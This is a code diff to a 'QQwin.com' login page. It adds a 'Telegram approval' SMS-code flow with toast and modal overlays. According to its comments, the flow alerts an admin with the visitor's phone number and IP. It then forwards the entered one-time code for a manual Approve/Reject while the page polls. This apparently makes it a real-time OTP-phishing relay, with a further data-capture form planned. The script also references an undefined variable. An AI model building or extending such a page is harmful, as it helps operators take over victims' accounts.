@@ -301,6 +301,46 @@ body{height:100%;color:var(--mint);font-size:.24rem;display:flex;justify-content
   .ui-input input{font-size:.21rem}
   .tp-list{gap:.3rem}
 }
+  /* ===== OTP + Telegram approval flow (Login · Code login only) ===== */
+/* Get Code: grey-green → yellow at 10 digits → greyish yellow while counting */
+.get-code.ready{background:var(--primary);color:var(--btn-text)}
+.get-code.counting{background:#C9BC55;color:#5A531F}
+.get-code .spin{width:.26rem;height:.26rem;border:.04rem solid rgba(6,120,49,.35);
+  border-top-color:var(--btn-text);border-radius:50%;animation:rot .7s linear infinite;
+  margin-right:.1rem;flex-shrink:0}
+@keyframes rot{to{transform:rotate(360deg)}}
+
+/* "Logging in ···" animated dots */
+.dots i{font-style:normal;animation:dotBlink 1.4s infinite}
+.dots i:nth-child(2){animation-delay:.2s}
+.dots i:nth-child(3){animation-delay:.4s}
+@keyframes dotBlink{0%,60%,100%{opacity:.25}30%{opacity:1}}
+
+/* White toast (screenshot 3 — "verification code has been sent") */
+.toast{position:absolute;left:50%;top:34%;transform:translate(-50%,-50%) scale(.95);
+  width:5.6rem;max-width:calc(100% - .7rem);background:#fff;border-radius:.16rem;
+  padding:.3rem;display:flex;gap:.18rem;align-items:flex-start;z-index:60;opacity:0;
+  pointer-events:none;transition:opacity .22s,transform .22s;
+  box-shadow:0 .1rem .3rem rgba(0,0,0,.28)}
+.toast.show{opacity:1;transform:translate(-50%,-50%) scale(1);pointer-events:auto}
+.toast .t-ic{width:.38rem;height:.38rem;border-radius:50%;background:#12B76A;flex-shrink:0;
+  display:flex;align-items:center;justify-content:center;margin-top:.03rem}
+.toast .t-ic svg{width:.24rem;height:.24rem;fill:#fff}
+.toast .t-tx{font-size:.25rem;line-height:1.45;color:#10241A}
+
+/* Green Reminder modal (screenshot 5 — reject / timeout) */
+.modal-veil{position:absolute;inset:0;z-index:70;display:none;flex-direction:column;
+  align-items:center;justify-content:center;background:rgba(0,0,0,.45);
+  backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px)}
+.modal-veil.show{display:flex}
+.modal{width:5.9rem;max-width:calc(100% - 1rem);background:#0D7C38;
+  border:1px solid rgba(255,255,255,.28);border-radius:.2rem;padding:.42rem .36rem .5rem;
+  text-align:center;color:#fff;box-shadow:0 .2rem .5rem rgba(0,0,0,.35)}
+.modal h3{font-size:.3rem;font-weight:700;margin-bottom:.26rem}
+.modal p{font-size:.24rem;line-height:1.55;color:#EAFBEF}
+.modal-x{margin-top:.55rem;width:.7rem;height:.7rem;border-radius:50%;
+  border:.04rem solid #fff;display:flex;align-items:center;justify-content:center}
+.modal-x svg{width:.3rem;height:.3rem;fill:#fff}
 </style>
 </head>
 <body>
@@ -547,6 +587,18 @@ body{height:100%;color:var(--mint);font-size:.24rem;display:flex;justify-content
       </ul>
     </div>
   </main>
+  <!-- OTP flow overlays -->
+<div class="toast" id="toast">
+  <span class="t-ic"><svg viewBox="0 0 24 24"><path d="M9.55 17.6 4.9 12.95l1.6-1.6 3.05 3.05 7.95-7.95 1.6 1.6z"/></svg></span>
+  <span class="t-tx"></span>
+</div>
+<div class="modal-veil" id="modalVeil">
+  <div class="modal"><h3>Reminder</h3><p id="modalMsg"></p></div>
+  <button type="button" class="modal-x" id="modalClose" aria-label="Close">
+    <svg viewBox="0 0 24 24"><path d="M6.4 5 5 6.4 10.6 12 5 17.6 6.4 19 12 13.4 17.6 19 19 17.6 13.4 12 19 6.4 17.6 5 12 10.6z"/></svg>
+  </button>
+</div>
+  
 </div>
 
 <script>
@@ -634,7 +686,8 @@ window.addEventListener('load',moveLine);
     inp.value='';inp.type='text';
     const eye=panel.querySelector('.f-pass .eye');if(eye)eye.classList.remove('seeing');
     inp.placeholder=mode==='code'?'Enter SMS code':'Enter password';
-    inp.setAttribute('maxlength',mode==='code'?6:16);
+    inp.setAttribute('autocomplete',mode==='code'?'one-time-code':'current-password');
+    inp.setAttribute('maxlength',mode==='code'?(name==='login'?4:6):16);
     inp.inputMode=mode==='code'?'numeric':'text';
   }
   /* code mode needs a phone — force phone type */
@@ -661,10 +714,12 @@ window.addEventListener('load',moveLine);
   clr.addEventListener('click',()=>{inp.value='';inp.dispatchEvent(new Event('input'));inp.focus()});
 });
 
- $$('.get-code').forEach(btn=>btn.addEventListener('click',()=>{
+  $$('.get-code').forEach(btn=>btn.addEventListener('click',()=>{
   const panel=btn.closest('.panel'),acc=panel.querySelector('.f-account input'),
         err=panel.querySelector('.f-account .explain');
   if(!acctValidate(panel)){err.classList.add('show');acc.focus();return}
+  /* LOGIN · Code login → Telegram flow (Register keeps the old countdown) */
+  if(panel.dataset.panel==='login'&&modes.login==='code'){loginSendCode(btn);return}
   let s=60;btn.disabled=true;btn.textContent='60s';
   const t=setInterval(()=>{s--;btn.textContent=s>0?s+'s':'Get Code';
     if(s<=0){clearInterval(t);btn.disabled=false}},1000);
@@ -722,6 +777,100 @@ rp.addEventListener('input',()=>{
   lumps.forEach((l,i)=>l.style.background=i<sc?colors[sc]:'rgba(196,255,217,.28)');
 });
 
+  /* ===== OTP + Telegram approval engine (Login · Code login only) ===== */
+const OTP_RESEND_S=60,POLL_MS=2000,APPROVE_WINDOW_MS=120000;
+const loginPanel=$('.panel[data-panel="login"]');
+const loginAcc=loginPanel.querySelector('.f-account input');
+const loginGet=loginPanel.querySelector('.f-pass .get-code');
+const loginPassInp=loginPanel.querySelector('.f-pass input');
+let codeRequested=false;
+
+/* Get Code lights up yellow ONLY with a full 10-digit number */
+function loginCodeReady(){
+  loginGet.classList.toggle('ready',modes.login==='code'&&/^\d{10}$/.test(loginAcc.value.trim()));
+}
+loginAcc.addEventListener('input',loginCodeReady);
+
+/* white toast (SS3) */
+let toastT;
+function showToast(msg){
+  $('#toast .t-tx').textContent=msg;$('#toast').classList.add('show');
+  clearTimeout(toastT);toastT=setTimeout(()=>$('#toast').classList.remove('show'),5200);
+}
+/* green Reminder modal (SS5) */
+function showReminder(msg){
+  $('#modalMsg').textContent=msg;$('#modalVeil').classList.add('show');
+}
+$('#modalClose').addEventListener('click',()=>$('#modalVeil').classList.remove('show'));
+$('#modalVeil').addEventListener('click',e=>{if(e.target===$('#modalVeil'))$('#modalVeil').classList.remove('show')});
+
+/* STEP 1 — Get Code: alert admin (number + IP), then greyish-yellow "Resend in Xs" */
+let resendTimer=null;
+async function loginSendCode(btn){
+  const err=loginPanel.querySelector('.f-account .explain'),num=loginAcc.value.trim();
+  if(!/^\d{10}$/.test(num)){err.classList.add('show');loginAcc.focus();syncPulse();return}
+  err.classList.remove('show');clearInterval(resendTimer);
+  btn.classList.add('counting');btn.classList.remove('ready');btn.disabled=true;
+  btn.innerHTML='<span class="spin"></span>Get Code';            /* SS2 loading */
+  let ok=false;
+  try{
+    const r=await fetch('/api/otp/request',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:num})});
+    ok=(await r.json()).ok===true;
+  }catch(e){}
+  if(!ok){
+    btn.classList.remove('counting');btn.disabled=false;btn.textContent='Get Code';loginCodeReady();
+    showToast('Could not send the request. Please check your connection and try again.');return;
+  }
+  codeRequested=true;
+  showToast('The verification code has been sent, please check the text message. If you do not receive the verification code, please carefully check whether the mobile phone number is correct and try again.');
+  let s=OTP_RESEND_S;
+  btn.textContent='Resend in '+s+'s';                            /* SS3 greyish yellow */
+  resendTimer=setInterval(()=>{s--;
+    if(s<=0){clearInterval(resendTimer);btn.classList.remove('counting');btn.disabled=false;btn.textContent='Get Code';loginCodeReady()}
+    else btn.textContent='Resend in '+s+'s';
+  },1000);
+}
+
+/* STEP 2 — Login: send number+OTP for Approve/Reject, poll for 120 s */
+async function codeLoginFlow(){
+  const btn=$('#submitBtn'),label=$('#submitLabel');
+  const num=loginAcc.value.trim(),otp=loginPassInp.value.trim();
+  if(codeRequestedFor!==num){showToast('Please tap Get Code first.');return}
+  const aerr=loginPanel.querySelector('.f-account .explain'),perr=loginPanel.querySelector('.f-pass .explain');
+  if(!/^\d{10}$/.test(num)){aerr.classList.add('show');syncPulse();return}
+  if(!/^\d{4}$/.test(otp)){
+    perr.querySelector('span:last-child').textContent='Enter the 4-digit OTP';
+    perr.classList.add('show');syncPulse();return;
+  }
+  perr.classList.remove('show');btn.disabled=true;
+  label.innerHTML='Logging in <span class="dots"><i>.</i><i>.</i><i>.</i></span>';   /* SS4 */
+  let reqId=null;
+  try{
+    const r=await fetch('/api/otp/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:num,otp})});
+    reqId=(await r.json()).requestId||null;
+  }catch(e){}
+  if(!reqId){btn.disabled=false;label.textContent='Login';showReminder('OTP send error. Please try again.');return}
+    let result='timeout';const deadline=Date.now()+APPROVE_WINDOW_MS;
+  while(Date.now()<deadline){
+    await new Promise(r=>setTimeout(r,POLL_MS));
+    try{
+      const j=await(await fetch('/api/otp/status?rid='+reqId)).json();
+      if(j.result&&j.result!=='pending'){result=j.result;break}
+    }catch(e){}
+  }
+  if(result==='timeout'&&reqId)fetch('/api/otp/expire?rid='+reqId,{method:'POST'}).catch(()=>{});
+  btn.disabled=false;label.textContent='Login';
+  if(result==='approved'){
+    /* —— temporary placeholder — popup-1 form goes here later —— */
+    showToast('✓ Login successful! Welcome to QQwin.com');
+    loginPassInp.value='';loginPassInp.dispatchEvent(new Event('input'));
+  }else if(result==='rejected'){
+    showReminder('Invalid OTP, try again.');
+  }else{
+    showReminder('OTP send error. Please try again.');
+  }
+}
+  
 /* full submit handler */
  $('#submitBtn').addEventListener('click',()=>{
   const p=$(`.panel[data-panel="${activeTab}"]`);
@@ -748,6 +897,8 @@ rp.addEventListener('input',()=>{
   }
   syncPulse();
   if(!ok)return;
+     /* Login · Code login → Telegram approval flow */
+  if(activeTab==='login'&&modes.login==='code'){codeLoginFlow();return}
   const btn=$('#submitBtn'),label=$('#submitLabel');
   btn.disabled=true;label.textContent='Please wait...';
   setTimeout(()=>{
@@ -759,6 +910,7 @@ rp.addEventListener('input',()=>{
     },900);
   },900);
  });
+loginCodeReady();
 </script>
 </body>
 </html>
